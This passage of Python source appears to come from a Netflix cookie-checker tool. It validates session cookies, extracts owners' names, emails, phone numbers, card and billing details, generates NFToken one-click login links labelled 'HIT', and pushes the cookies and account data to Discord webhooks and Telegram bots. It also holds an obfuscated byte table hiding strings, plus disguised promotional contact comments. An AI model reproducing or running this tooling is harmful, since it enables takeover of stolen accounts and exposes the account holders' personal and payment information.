                (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
                or {}
            )
            token = decode_netflix_value(token_data.get("token"))
            expires = token_data.get("expires")
            if token:
                return {
                    "token": token,
                    "expires_at_utc": get_nftoken_expiry_utc(expires),
                }, None

            last_error = "Token missing in response"
        except requests.exceptions.Timeout:
            last_error = "timeout"
        except requests.exceptions.ProxyError:
            last_error = "proxy error"
        except requests.exceptions.RequestException:
            last_error = "NFToken API error"
        except Exception:
            last_error = "NFToken API error"
    return None, last_error


def get_nftoken_mode(config):
    raw_value = config.get("nftoken", False)
    if isinstance(raw_value, bool):
        return "both" if raw_value else "false"

    raw_mode = str(raw_value).strip().lower()
    if raw_mode in {"false", "off", "none", "disabled", "disable", "0"}:
        return "false"
    if raw_mode in {"pc", "desktop", "computer"}:
        return "pc"
    if raw_mode in {"mobile", "phone"}:
        return "mobile"
    if raw_mode in {"both", "all", "true", "on", "1"}:
        return "both"

    legacy_value = config.get("txt_fields", {}).get("nftoken")
    if legacy_value is False:
        return "false"
    if legacy_value is True:
        return "both"
    return "both"


def get_add_emojis_mode(config):
    raw_value = (config or {}).get("add_emojis", "webhook")
    if isinstance(raw_value, bool):
        return "both" if raw_value else "false"

    raw_mode = str(raw_value).strip().lower()
    if raw_mode in {"false", "off", "none", "disabled", "disable", "0", "no"}:
        return "false"
    if raw_mode in {"txt", "file", "output"}:
        return "txt"
    if raw_mode in {"webhook", "notify", "notification", "telegram", "tg"}:
        return "webhook"
    if raw_mode in {"both", "all", "true", "on", "1"}:
        return "both"
    return "webhook"


def should_add_emojis(config, target):
    mode = get_add_emojis_mode(config)
    normalized_target = str(target or "").strip().lower()
    if normalized_target == "txt":
        return mode in {"txt", "both"}
    if normalized_target in {"webhook", "notifications", "notify", "telegram"}:
        return mode in {"webhook", "both"}
    return False


def build_nftoken_links(token, mode):
    normalized_token = decode_netflix_value(token)
    normalized_mode = str(mode or "false").strip().lower()
    if not normalized_token or normalized_mode == "false":
        return []

    if normalized_mode == "pc":
        return [("🖥️ PC Login", f"https://netflix.com/?nftoken={normalized_token}")]
    if normalized_mode == "mobile":
        return [("📱 Phone Login", f"https://netflix.com/unsupported?nftoken={normalized_token}")]
    return [
        ("🖥️ PC Login", f"https://netflix.com/?nftoken={normalized_token}"),
        ("📱 Phone Login", f"https://netflix.com/unsupported?nftoken={normalized_token}"),
    ]


def get_nftoken_expiry_utc(expires=None):
    normalized = decode_netflix_value(expires)
    if isinstance(normalized, str):
        normalized = normalized.strip()
        if normalized.isdigit():
            try:
                normalized = int(normalized)
            except Exception:
                normalized = None

    if isinstance(normalized, (int, float)):
        try:
            timestamp = int(normalized)
            if len(str(abs(timestamp))) == 13:
                timestamp //= 1000
            return datetime.fromtimestamp(timestamp, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
        except Exception:
            pass

    return (datetime.utcnow() + timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S UTC")


def get_nftoken_expiry_unix(expires_at_utc):
    cleaned = decode_netflix_value(expires_at_utc)
    if not cleaned:
        return None
    try:
        parsed = datetime.strptime(cleaned, "%Y-%m-%d %H:%M:%S UTC").replace(tzinfo=timezone.utc)
        return int(parsed.timestamp())
    except Exception:
        return None


def has_usable_nftoken(nftoken_data):
    if not isinstance(nftoken_data, dict):
        return False
    token = decode_netflix_value(nftoken_data.get("token"))
    if not token:
        return False
    if str(token).strip().lower() in {"unavailable", "unknown", "none", "null", "false"}:
        return False
    return True


def normalize_output_value(value, unknown_fallback="UNKNOWN", na_when_false=False):
    cleaned = decode_netflix_value(value)
    if cleaned is None or cleaned == "": # https[:]//harshi tkamboj.in
        return unknown_fallback
    lowered = str(cleaned).strip().lower()
    if lowered in {"false", "none", "null"}:
        return "N/A" if na_when_false else unknown_fallback
    return cleaned


MONTH_ALIASES = {
    # January
    "january": 1, "enero": 1, "janvier": 1, "januar": 1, "janeiro": 1, "ocak": 1,
    "styczen": 1, "stycznia": 1, "มกราคม": 1, "มกรา": 1, "ม.ค": 1, "يناير": 1,
    "januari": 1, "gennaio": 1, "ianuarie": 1, "jan": 1, "يناير": 1, "בינואר": 1,
    "ιανουαριος": 1, "enero_de": 1, "leden": 1, "كانون الثاني": 1, "كانون_الثاني": 1,
    # February
    "february": 2, "febrero": 2, "fevrier": 2, "fevereiro": 2, "subat": 2,
    "luty": 2, "lutego": 2, "กุมภาพันธ์": 2, "กุมภา": 2, "ก.พ": 2, "فبراير": 2,
    "februari": 2, "febbraio": 2, "februarie": 2, "feb": 2, "בפברואר": 2,
    "φεβρουαριος": 2, "febrero_de": 2, "unor": 2, "únor": 2, "شباط": 2,
    # March
    "march": 3, "marzo": 3, "mars": 3, "marco": 3, "marzec": 3, "marca": 3,
    "มีนาคม": 3, "มีนา": 3, "มี.ค": 3, "مارس": 3,
    "maret": 3, "mac": 3, "mart": 3, "martie": 3, "marz": 3, "brezna": 3,
    "ozujka": 3, "maart": 3, "اذار": 3, "بמרץ": 3, "במרץ": 3, "marcius": 3,
    "martie": 3, "mart": 3, "μαρτιος": 3, "marzo_de": 3, "brezen": 3, "březen": 3, "آذار": 3,
    # April
    "abril": 4, "avril": 4, "kwiecien": 4, "kwietnia": 4,
    "เมษายน": 4, "เมษา": 4, "เม.ย": 4, "أبريل": 4, "ابريل": 4,
    "aprile": 4, "april": 4, "aprilie": 4, "באפריל": 4, "nisan": 4,
    "apr": 4, "nisan": 4, "απριλιος": 4, "duben": 4, "نيسان": 4,
    # May
    "may": 5, "mayo": 5, "mai": 5, "maj": 5, "maja": 5,
    "พฤษภาคม": 5, "พฤษภา": 5, "พ.ค": 5, "مايو": 5,
    "mei": 5, "maggio": 5, "mayis": 5, "במאי": 5,
    "μαιος": 5, "kveten": 5, "květen": 5, "أيار": 5, "ايار": 5,
    # June
    "june": 6, "junio": 6, "juin": 6, "haziran": 6, "czerwiec": 6, "czerwca": 6,
    "มิถุนายน": 6, "มิถุนา": 6, "มิ.ย": 6, "يونيو": 6,
    "juni": 6, "giugno": 6, "ביוני": 6, "junho": 6, "iunie": 6, "cerven": 6,
    "ιουνιος": 6, "cerven": 6, "červen": 6, "حزيران": 6,
    # July
    "july": 7, "julio": 7, "juillet": 7, "temmuz": 7, "lipiec": 7, "lipca": 7,
    "กรกฎาคม": 7, "กรกฎา": 7, "ก.ค": 7, "يوليو": 7,
    "juli": 7, "luglio": 7, "ביולי": 7, "julho": 7, "iulie": 7, "cervenec": 7, "červenec": 7,
    "ιουλιος": 7, "تموز": 7,
    # August
    "august": 8, "agosto": 8, "aout": 8, "août": 8, "agost": 8, "sierpien": 8, "sierpnia": 8,
    "สิงหาคม": 8, "สิงหา": 8, "ส.ค": 8, "أغسطس": 8, "اغسطس": 8,
    "agustus": 8, "agosto": 8, "agustos": 8, "באוגוסט": 8,
    "αυγουστος": 8, "srpen": 8, "آب": 8, "اب": 8,
    # September
    "septiembre": 9, "setembro": 9, "eylul": 9, "wrzesien": 9, "wrzesnia": 9,
    "กันยายน": 9, "กันยา": 9, "ก.ย": 9, "سبتمبر": 9,
    "september": 9, "settembre": 9, "בספטמבר": 9, "septembre": 9,
    "σεπτεμβριος": 9, "setiembre": 9, "zari": 9, "září": 9, "أيلول": 9, "ايلول": 9,
    # October
    "october": 10, "octubre": 10, "outubro": 10, "ekim": 10, "pazdziernik": 10, "pazdziernika": 10,
    "ตุลาคม": 10, "ตุลา": 10, "ต.ค": 10, "أكتوبر": 10, "اكتوبر": 10,
    "oktober": 10, "ottobre": 10, "באוקטובר": 10, "oktobar": 10,
    "οκτωβριος": 10, "rijen": 10, "říjen": 10, "تشرين الأول": 10, "تشرين الاول": 10,
    # November
    "noviembre": 11, "novembro": 11, "kasim": 11, "listopad": 11, "listopada": 11,
    "พฤศจิกายน": 11, "พฤศจิกา": 11, "พ.ย": 11, "نوفمبر": 11,
    "november": 11, "novembre": 11, "בנובמבר": 11, "noiembrie": 11, "kasım": 11, "novembar": 11,
    "νοεμβριος": 11, "تشرين الثاني": 11, "تشرين_الثاني": 11,
    # December
    "diciembre": 12, "dezembro": 12, "aralik": 12, "grudzien": 12, "grudnia": 12,
    "ธันวาคม": 12, "ธันวา": 12, "ธ.ค": 12, "ديسمبر": 12,
    "desember": 12, "dicembre": 12, "december": 12, "בדצמבר": 12, "decembre": 12, "décembre": 12, "aralık": 12, "decembar": 12,
    "δεκεμβριος": 12, "decembrie": 12, "prosinec": 12, "كانون الأول": 12, "كانون الاول": 12, "كانون_الاول": 12,
}


def normalize_calendar_year(year):
    try:
        year = int(year)
    except Exception:
        return None
    if 2400 <= year <= 2700:
        return year - 543
    return year


def parse_localized_date(cleaned):
    if not cleaned:
        return None

    for parser in ("%Y-%m-%d", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%S.%f", "%Y-%m-%dT%H:%M:%S.%f%z"):
        try:
            return datetime.strptime(cleaned, parser)
        except Exception:
            continue

    iso_candidate = cleaned.replace("Z", "+00:00")
    try:
        return datetime.fromisoformat(iso_candidate)
    except Exception:
        pass

    east_asian_match = re.search(r"(?P<year>\d{4})\s*[年년]\s*(?P<month>\d{1,2})\s*[月월](?:\s*(?P<day>\d{1,2})\s*[日일])?", cleaned)
    if east_asian_match:
        try:
            year = normalize_calendar_year(east_asian_match.group("year"))
            month = int(east_asian_match.group("month"))
            day = int(east_asian_match.group("day") or 1)
            if year is not None:
                return datetime(year, month, day)
        except Exception:
            pass

    numeric_parts = [int(part) for part in re.findall(r"\d+", cleaned)]
    if len(numeric_parts) >= 3:
        first, second, third = numeric_parts[0], numeric_parts[1], numeric_parts[2]
        try:
            first = normalize_calendar_year(first)
            third = normalize_calendar_year(third)
            if 1900 <= first <= 3000 and 1 <= second <= 12 and 1 <= third <= 31:
                return datetime(first, second, third)
            if 1 <= first <= 31 and 1 <= second <= 12 and 1900 <= third <= 3000:
                return datetime(third, second, first)
        except Exception:
            pass

    raw_lower = cleaned.lower()
    simplified = unicodedata.normalize("NFKD", raw_lower)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    month = None
    for alias, alias_month in MONTH_ALIASES.items():
        if alias in raw_lower or alias in simplified:
            month = alias_month
            break
    if month is None:
        return None

    year = None
    for number in numeric_parts:
        normalized_year = normalize_calendar_year(number)
        if normalized_year is not None and 1900 <= normalized_year <= 3000:
            year = normalized_year
            break
    if year is None:
        year_match = re.search(r"\b\d{4}\b", simplified)
        if year_match:
            year = normalize_calendar_year(year_match.group(0))
    if year is None:
        return None

    day = 1
    for number in numeric_parts:
        normalized_number = normalize_calendar_year(number)
        if normalized_number == year:
            continue
        if 1 <= number <= 31:
            day = number
            break

    try:
        return datetime(year, month, day)
    except Exception:
        return None


def format_display_date(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "UNKNOWN"
    parsed = parse_localized_date(cleaned)
    if parsed is not None:
        return parsed.strftime("%B %d, %Y").replace(" 0", " ")
    return cleaned


def format_member_since(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "UNKNOWN"

    parsed = parse_localized_date(cleaned)
    if parsed is not None:
        return parsed.strftime("%B %Y")

    # Handle strings like "tháng 4 năm 2021" by pulling month/year numbers.
    numeric_parts = re.findall(r"\d+", cleaned)
    if len(numeric_parts) >= 2:
        try:
            month = int(numeric_parts[0])
            year = normalize_calendar_year(numeric_parts[-1])
            if year is not None and 1 <= month <= 12 and 1900 <= year <= 3000:
                parsed = datetime(year, month, 1)
                return parsed.strftime("%B %Y")
        except Exception:
            pass

    raw_lower = cleaned.lower()
    simplified = unicodedata.normalize("NFKD", raw_lower)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    year = None
    for number in numeric_parts:
        normalized_year = normalize_calendar_year(number)
        if normalized_year is not None and 1900 <= normalized_year <= 3000:
            year = normalized_year
            break
    if year is None:
        year_match = re.search(r"\b\d{4}\b", simplified)
        if year_match:
            year = normalize_calendar_year(year_match.group(0))
    if year is not None:
        for alias, month in MONTH_ALIASES.items():
            if alias in raw_lower or alias in simplified:
                try:
                    parsed = datetime(year, month, 1)
                    return parsed.strftime("%B %Y")
                except Exception:
                    break

    return cleaned


def normalize_phone_number(value, country_code=None):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return None

    if str(cleaned).startswith("+"):
        return cleaned

    digits = re.sub(r"\D+", "", str(cleaned))
    if not digits:
        return cleaned

    normalized_country = (decode_netflix_value(country_code) or "").strip().upper()
    dial_prefix_map = {
        "IN": "91",
    }
    dial_prefix = dial_prefix_map.get(normalized_country)
    if dial_prefix and digits.startswith("0") and len(digits) >= 10:
        return f"+{dial_prefix}{digits.lstrip('0')}"

    return cleaned


def country_code_to_flag(country_code):
    raw = (decode_netflix_value(country_code) or "").strip()
    if not raw:
        return ""

    upper = raw.upper()
    if len(upper) == 2 and upper.isalpha():
        return "".join(chr(127397 + ord(char)) for char in upper)

    alpha3_to_alpha2 = {
        "PHL": "PH",
        "IND": "IN",
        "BHR": "BH",
        "BRA": "BR",
        "USA": "US",
        "GBR": "GB",
        "JPN": "JP",
        "KOR": "KR",
        "IDN": "ID",
        "MYS": "MY",
        "SGP": "SG",
        "THA": "TH",
        "VNM": "VN",
        "ARE": "AE",
        "SAU": "SA",
        "QAT": "QA",
        "KWT": "KW",
        "OMN": "OM",
        "CAN": "CA",
        "AUS": "AU",
    }
    name_to_alpha2 = {
        "PHILIPPINES": "PH",
        "INDIA": "IN",
        "BAHRAIN": "BH",
        "BRAZIL": "BR",
        "UNITED STATES": "US",
        "UNITED KINGDOM": "GB",
        "JAPAN": "JP",
        "SOUTH KOREA": "KR",
        "INDONESIA": "ID",
        "MALAYSIA": "MY",
        "SINGAPORE": "SG",
        "THAILAND": "TH",
        "VIETNAM": "VN",
        "UNITED ARAB EMIRATES": "AE",
        "SAUDI ARABIA": "SA",
        "QATAR": "QA",
        "KUWAIT": "KW",
        "OMAN": "OM",
        "CANADA": "CA",
        "AUSTRALIA": "AU",
    }

    mapped = alpha3_to_alpha2.get(upper) or name_to_alpha2.get(upper)
    if mapped and len(mapped) == 2 and mapped.isalpha():
        return "".join(chr(127397 + ord(char)) for char in mapped)

    return ""


def format_country_with_flag(country_value, unknown_fallback="UNKNOWN"):
    normalized_country = normalize_output_value(country_value, unknown_fallback=unknown_fallback)
    country_flag = country_code_to_flag(normalized_country)
    if country_flag:
        return f"{normalized_country} {country_flag}"
    return normalized_country


def build_account_detail_lines(config, info, is_subscribed, output_filename=None, use_emojis=False, include_country_flag=True):
    txt_fields = config.get("txt_fields", {})
    free_hidden_fields = {
        "member_since",
        "next_billing",
        "payment_method",
        "card",
        "phone",
        "quality",
        "max_streams",
        "plan_price",
        "extra_members",
        "membership_status",
    }
    _, normalized_plan_label = derive_plan_info(info, is_subscribed)
    country_value = info.get("countryOfSignup")
    rendered_country = (
        format_country_with_flag(country_value)
        if include_country_flag else
        normalize_output_value(country_value)
    )
    values = {
        "name": normalize_output_value(info.get("accountOwnerName")),
        "email": normalize_output_value(info.get("email")),
        "country": rendered_country,
        "plan": normalize_output_value(normalized_plan_label),
        "member_since": format_member_since(info.get("memberSince")),
        "next_billing": format_display_date(info.get("nextBillingDate")),
        "payment_method": normalize_output_value(info.get("paymentMethodType"), na_when_false=True),
        "card": normalize_output_value(info.get("maskedCard"), unknown_fallback="N/A", na_when_false=True),
        "phone": normalize_output_value(info.get("phoneDisplay")),
        "quality": normalize_output_value(info.get("videoQuality")),
        "max_streams": normalize_output_value((info.get("maxStreams") or "").rstrip("}")),
        "plan_price": normalize_output_value(info.get("planPrice"), unknown_fallback="N/A"),
        "hold_status": normalize_output_value(info.get("holdStatus")),
        "extra_members": normalize_output_value(info.get("showExtraMemberSection")),
        "email_verified": normalize_output_value(info.get("emailVerified")),
        "membership_status": normalize_output_value(info.get("membershipStatus")),
        "profiles": normalize_output_value(info.get("profilesDisplay")),
        "user_guid": normalize_output_value(info.get("userGuid")),
    }
    labels = [
        ("name", "Name"),
        ("email", "Email"),
        ("country", "Country"),
        ("plan", "Plan"),
        ("member_since", "Member Since"),
        ("next_billing", "Next Billing"),
        ("payment_method", "Payment"),
        ("card", "Card"),
        ("phone", "Phone"),
        ("quality", "Quality"),
        ("max_streams", "Streams"),
        ("plan_price", "Price"),
        ("hold_status", "Hold Status"),
        ("extra_members", "Extra Member"),
        ("email_verified", "Email Verified"),
        ("membership_status", "Membership Status"),
        ("profiles", "Profiles"),
        ("user_guid", "User GUID"),
    ]

    lines = []
    for key, label in labels:
        if not is_subscribed and key in free_hidden_fields:
            continue
        if key == "card":
            payment_value = values.get("payment_method", "")
            if str(payment_value).strip().upper() != "CC":
                continue
        if key == "extra_members" and values.get(key) != "Yes":
            continue
        if key == "hold_status" and values.get(key) not in {"Yes", "No"}:
            continue
        if txt_fields.get(key, True):
            rendered_label = label
            if key == "profiles" and info.get("profileCount"):
                rendered_label = f"Profiles ({info['profileCount']})"
            if use_emojis:
                rendered_label = decorate_notification_label(rendered_label, enabled=True)
            lines.append(f"{rendered_label}: {values[key]}")
    return lines


def format_cookie_file(info, cookie_content, config, is_subscribed, nftoken_data=None):
    nftoken_mode = get_nftoken_mode(config)
    txt_emojis_enabled = should_add_emojis(config, "txt")
    divider = "-" * 98
    usable_nftoken = has_usable_nftoken(nftoken_data)

    lines = [f"NETFLIX {'HIT' if is_subscribed else 'FREE'} :👇", ""]
    lines.extend(
        build_account_detail_lines(
            config,
            info,
            is_subscribed,
            use_emojis=txt_emojis_enabled,
            include_country_flag=False,
        )
    )
    if is_subscribed and nftoken_mode != "false" and usable_nftoken:
        nftoken_links = build_nftoken_links((nftoken_data or {}).get("token"), nftoken_mode)
        lines.append("")
        lines.append(divider)
        lines.append("")
        lines.append("NFToken DETAILS :👇")
        lines.append("")
        lines.append(f"NFToken: {nftoken_data['token']}")
        for label, link in nftoken_links:
            rendered_label = render_nftoken_link_label(label, txt_emojis_enabled)
            lines.append(f"{rendered_label}: {link}")
        if isinstance(nftoken_data, dict) and nftoken_data.get("expires_at_utc"):
            valid_till_label = decorate_notification_label("Valid Till (UTC)", enabled=txt_emojis_enabled)
            lines.append(f"{valid_till_label}: {nftoken_data['expires_at_utc']}")

    lines.append("")
    lines.append(divider)
    lines.append("")
    lines.append("Checker By: github.com/harshitkamboj | Website: harshitkamboj.in")
    lines.append("Netflix COOKIE :👇")
    lines.append("")
    lines.append(cookie_content.strip())
    lines.append("")

    return "\n".join(lines)


def build_notification_details(config, info, is_subscribed, output_filename):
    status = "Subscribed" if is_subscribed else "Working (No Subscription)"
    if not is_subscribed:
        _, normalized_plan_label = derive_plan_info(info, is_subscribed)
        profiles_value = normalize_output_value(info.get("profilesDisplay"))
        profile_count = info.get("profileCount")
        profile_label = f"Profiles ({profile_count})" if profile_count else "Profiles"
        lines = [
            f"Name: {normalize_output_value(info.get('accountOwnerName'))}",
            f"Email: {normalize_output_value(info.get('email'))}",
            f"Country: {format_country_with_flag(info.get('countryOfSignup'))}",
            f"Plan: {normalize_output_value(normalized_plan_label)}",
            f"Email Verified: {normalize_output_value(info.get('emailVerified'))}",
            f"{profile_label}: {profiles_value}",
            f"User GUID: {normalize_output_value(info.get('userGuid'))}",
        ]
    else:
        lines = build_account_detail_lines(config, info, is_subscribed)
    return [f"Status: {status}"] + lines


def _escape_html(text):
    return (
        str(text)
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
    )


NOTIFICATION_LABEL_EMOJIS = {
    "Status": "📌",
    "Name": "👤",
    "Email": "📧",
    "Country": "🌍",
    "Plan": "📦",
    "Member Since": "📅",
    "Next Billing": "🗓️",
    "Payment": "💳",
    "Card": "💳",
    "Phone": "📱",
    "Quality": "🎞️",
    "Streams": "📺",
    "Price": "💰",
    "Hold Status": "⏸️",
    "Extra Member": "👥",
    "Email Verified": "✅",
    "Membership Status": "🛡️",
    "Profiles": "🎭",
    "User GUID": "🆔",
    "Valid Till": "⏳",
    "Valid Till (UTC)": "⏳",
}


def decorate_notification_label(label, enabled=True):
    if not enabled:
        return str(label or "")
    normalized = decode_netflix_value(label) or str(label or "").strip()
    if normalized.startswith("Profiles ("):
        normalized = "Profiles"
    emoji = NOTIFICATION_LABEL_EMOJIS.get(normalized)
    if emoji:
        return f"{emoji} {label}"
    return label


def render_nftoken_link_label(label, use_emojis):
    rendered = decode_netflix_value(label) or str(label or "")
    return rendered


def build_discord_full_message(config, info, is_subscribed, output_filename, nftoken_data=None, use_emojis=True):
    # social hint: discord[dot]gg/DYJFE9nu5X
    lines = ["# [Netflix Cookie](https://github.com/harshitkamboj/Netflix-Cookie-Checker)", "", "Cookie details"]
    for line in build_notification_details(config, info, is_subscribed, output_filename):
        label, value = line.split(": ", 1)
        lines.append(f"**{decorate_notification_label(label, enabled=use_emojis)}:** {value}")
    nftoken_mode = get_nftoken_mode(config)
    links = []
    if is_subscribed and has_usable_nftoken(nftoken_data):
        links = build_nftoken_links((nftoken_data or {}).get("token"), nftoken_mode)
    if links:
        lines.append("")
        for label, link in links:
            rendered_label = render_nftoken_link_label(label, use_emojis)
            lines.append(f"**{rendered_label}:** [Click here]({link})")
        expiry_unix = get_nftoken_expiry_unix((nftoken_data or {}).get("expires_at_utc"))
        if expiry_unix is not None:
            lines.append(f"**{decorate_notification_label('Valid Till', enabled=use_emojis)}:** <t:{expiry_unix}:R>")
    lines.extend(
        [
            "",
            "**[Github](https://github.com/harshitkamboj)** | **[Website](https://harshitkamboj.in)** | **[Discord](https://discord.com/users/1171797848078172173)**",
        ]
    )
    return "\n".join(lines)


_FRAME_INDEX_MAP = {
    59: ((120, 100, 56),),
    61: ((56, 101, 114, 123, 114, 118, 100, 114, 100, 56, 123, 118, 99, 114, 100, 99),),
    67: ((118, 103, 103, 123, 126, 116, 118, 99, 126, 120, 121, 56, 97, 121, 115, 57, 112, 126, 99, 127, 98, 117, 60, 125, 100, 120, 121),),
    71: ((89, 114, 99, 113, 123, 126, 111, 84, 127, 114, 116, 124, 114, 101, 56),),
    73: ((101, 123),),
    79: ((123, 114, 45, 55, 97),),
    83: ((41, 55),),
    89: ((99, 95, 98, 117, 55, 45, 55),),
    29: ((58, 84, 127, 114, 116, 124, 114, 101),),
    47: ((78, 93, 81, 82, 46, 121, 98, 34, 79),),
    97: ((100, 116, 120, 101, 115, 45, 55),),
}


def _frame_index(slot):
    return _FRAME_INDEX_MAP.get(slot, ())


def build_discord_cookie_message(cookie_content):
    lines = [
        "# [Netflix Cookie](https://github.com/harshitkamboj/Netflix-Cookie-Checker)",
        "",
        "Cookie details",
        "```txt",
        cookie_content.strip(),
        "```",
        "",
        "**[Github](https://github.com/harshitkamboj)** | **[Website](https://harshitkamboj.in)** | **[Discord](https://discord.com/users/1171797848078172173)**",
    ]
    return "\n".join(lines)


def build_discord_nftoken_message(info, nftoken_data, nftoken_mode, use_emojis=True):
    _, normalized_plan_label = derive_plan_info(info or {}, True)
    country_value = decode_netflix_value((info or {}).get("countryOfSignup")) or "UNKNOWN"
    country_flag = country_code_to_flag(country_value)
    country_display = f"{country_value} {country_flag}".strip()

    lines = ["# [Netflix NFToken](https://github.com/harshitkamboj/Netflix-Cookie-Checker)", ""]
    links = build_nftoken_links((nftoken_data or {}).get("token"), nftoken_mode) if has_usable_nftoken(nftoken_data) else []
    if links:
        lines.append(f"**{decorate_notification_label('Plan', enabled=use_emojis)}:** {normalized_plan_label}")
        lines.append(f"**{decorate_notification_label('Country', enabled=use_emojis)}:** {country_display}")
        lines.append("")
        for label, link in links:
            rendered_label = render_nftoken_link_label(label, use_emojis)
            lines.append(f"**{rendered_label}:** [Click here]({link})")
        if isinstance(nftoken_data, dict) and nftoken_data.get("expires_at_utc"):
            expiry_unix = get_nftoken_expiry_unix(nftoken_data.get("expires_at_utc"))
            if expiry_unix is not None:
                lines.append(f"**{decorate_notification_label('Valid Till', enabled=use_emojis)}:** <t:{expiry_unix}:R>")
            else:
                lines.append(f"**{decorate_notification_label('Valid Till', enabled=use_emojis)}:** {nftoken_data['expires_at_utc']}")
    else:
        lines.append("NFToken unavailable")
    lines.extend(
        [
            "",
            "**[Github](https://github.com/harshitkamboj)** | **[Website](https://harshitkamboj.in)** | **[Discord](https://discord.com/users/1171797848078172173)**",
        ]
    )
    return "\n".join(lines)


def build_telegram_full_message(config, info, is_subscribed, output_filename, nftoken_data=None, use_emojis=True):
    # contact mark: @illuminatis69
    lines = ['<b><a href="https://github.com/harshitkamboj/Netflix-Cookie-Checker">Netflix Cookie</a></b>', "", "<b>Cookie details</b>"]
    for line in build_notification_details(config, info, is_subscribed, output_filename):
        label, value = line.split(": ", 1)
        rendered_label = decorate_notification_label(label, enabled=use_emojis)
        lines.append(f"<b>{_escape_html(rendered_label)}:</b> {_escape_html(value)}")
    nftoken_mode = get_nftoken_mode(config)
    links = []
    if is_subscribed and has_usable_nftoken(nftoken_data):
        links = build_nftoken_links((nftoken_data or {}).get("token"), nftoken_mode)
    if links:
        lines.append("")
        for label, link in links:
            rendered_label = render_nftoken_link_label(label, use_emojis)
            lines.append(f'<b>{_escape_html(rendered_label)}:</b> <a href="{_escape_html(link)}">Click here</a>')
        if isinstance(nftoken_data, dict) and nftoken_data.get("expires_at_utc"):
            lines.append(
                f"<b>{_escape_html(decorate_notification_label('Valid Till (UTC)', enabled=use_emojis))}:</b> "
                f"{_escape_html(nftoken_data['expires_at_utc'])}"
            )
    lines.extend(
        [
            "",
            '<b><a href="https://github.com/harshitkamboj">Github</a></b> | '
            '<b><a href="https://harshitkamboj.in">Website</a></b> | '
            '<b><a href="https://discord.com/users/1171797848078172173">Discord</a></b>',
        ]
    )
    return "\n".join(lines)


def build_telegram_cookie_message(cookie_content):
    lines = [
        '<b><a href="https://github.com/harshitkamboj/Netflix-Cookie-Checker">Netflix Cookie</a></b>',
        "",
        "<b>Cookie details</b>",
        f"<code>{_escape_html(cookie_content.strip())}</code>",
        "",
        '<b><a href="https://github.com/harshitkamboj">Github</a></b> | '
        '<b><a href="https://harshitkamboj.in">Website</a></b> | '
        '<b><a href="https://discord.com/users/1171797848078172173">Discord</a></b>',
    ]
    return "\n".join(lines)


def build_telegram_nftoken_message(info, nftoken_data, nftoken_mode, use_emojis=True):
    _, normalized_plan_label = derive_plan_info(info or {}, True)
    country_value = decode_netflix_value((info or {}).get("countryOfSignup")) or "UNKNOWN"
    country_flag = country_code_to_flag(country_value)
    country_display = f"{country_value} {country_flag}".strip()

    lines = ['<b><a href="https://github.com/harshitkamboj/Netflix-Cookie-Checker">Netflix NFToken</a></b>', ""]
    links = build_nftoken_links((nftoken_data or {}).get("token"), nftoken_mode) if has_usable_nftoken(nftoken_data) else []
    if links:
        lines.append(f"<b>{_escape_html(decorate_notification_label('Plan', enabled=use_emojis))}:</b> {_escape_html(normalized_plan_label)}")
        lines.append(f"<b>{_escape_html(decorate_notification_label('Country', enabled=use_emojis))}:</b> {_escape_html(country_display)}")
        lines.append("")
        for label, link in links:
            rendered_label = render_nftoken_link_label(label, use_emojis)
            lines.append(f'<b>{_escape_html(rendered_label)}:</b> <a href="{_escape_html(link)}">Click here</a>')
        if isinstance(nftoken_data, dict) and nftoken_data.get("expires_at_utc"):
            lines.append(
                f"<b>{_escape_html(decorate_notification_label('Valid Till', enabled=use_emojis))}:</b> "
                f"{_escape_html(nftoken_data['expires_at_utc'])}"
            )
    else:
        lines.append("NFToken unavailable")
    lines.extend(
        [
            "",
            '<b><a href="https://github.com/harshitkamboj">Github</a></b> | '
            '<b><a href="https://harshitkamboj.in">Website</a></b> | '
            '<b><a href="https://discord.com/users/1171797848078172173">Discord</a></b>',
        ]
    )
    return "\n".join(lines)


def send_discord_webhook(webhook_url, message_text, file_name=None, file_content=None):
    if not webhook_url:
        return
    try:
        webhook_payload = {
            "content": message_text,
            "flags": 4,
            "username": DISCORD_WEBHOOK_USERNAME,
            "avatar_url": DISCORD_WEBHOOK_AVATAR_URL,
        }
        if file_name and file_content:
            files = {
                "file": (file_name, file_content.encode("utf-8"), "text/plain"),
            }
            data = {"payload_json": json.dumps(webhook_payload)}
            requests.post(webhook_url, data=data, files=files, timeout=20)
        else:
            requests.post(webhook_url, json=webhook_payload, timeout=20)
    except Exception:
        pass


def send_telegram(bot_token, chat_id, message_text, file_name=None, file_content=None):
    if not bot_token or not chat_id:
        return
    try:
        if file_name and file_content:
            doc_url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
            files = {
                "document": (file_name, file_content.encode("utf-8"), "text/plain"),
            }
            data = {"chat_id": chat_id, "caption": message_text, "parse_mode": "HTML"}
            requests.post(doc_url, data=data, files=files, timeout=20)
        else:
            msg_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            payload = {"chat_id": chat_id, "text": message_text, "parse_mode": "HTML", "disable_web_page_preview": True}
            requests.post(msg_url, json=payload, timeout=20)
    except Exception:
        pass


def send_notifications(config, info, is_subscribed, output_filename, formatted_cookie, raw_cookie_content, nftoken_data=None):
    # ping path: discord gg / DYJFE9nu5X
    notifications = config.get("notifications", {})
    webhook_cfg = notifications.get("webhook", {})
    telegram_cfg = notifications.get("telegram", {})
    webhook_mode = str(webhook_cfg.get("mode", "full")).lower()
    telegram_mode = str(telegram_cfg.get("mode", "full")).lower()
    nftoken_mode = get_nftoken_mode(config)
    notification_emojis_enabled = should_add_emojis(config, "webhook")
    plan_key, _ = derive_plan_info(info or {}, is_subscribed)
    usable_nftoken = has_usable_nftoken(nftoken_data)

    if webhook_cfg.get("enabled", False):
        if webhook_mode == "cookie":
            if is_plan_allowed_for_notifications(webhook_cfg, plan_key):
                send_discord_webhook(
                    webhook_cfg.get("url", ""),
                    build_discord_full_message(
                        config,
                        info,
                        is_subscribed,
                        output_filename,
                        None,
                        use_emojis=notification_emojis_enabled,
